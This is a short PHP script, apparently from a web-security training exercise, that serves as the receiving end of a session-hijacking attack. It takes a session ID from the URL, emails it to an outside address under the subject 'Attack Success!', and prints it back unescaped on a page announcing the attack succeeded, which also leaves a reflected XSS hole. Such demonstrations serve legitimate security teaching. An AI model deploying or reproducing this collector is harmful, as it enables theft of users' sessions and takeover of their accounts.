<?php
    mb_language('ui');
    $sid = $_GET['sid'];
    mb_send_mail('websecurity@qytang.com', 'Attack Success!', 'Session ID: ' . $sid, 'from: websecurity@qytang.com');
?>
<body>攻击成功<br>
<?php echo $sid; ?>
</body>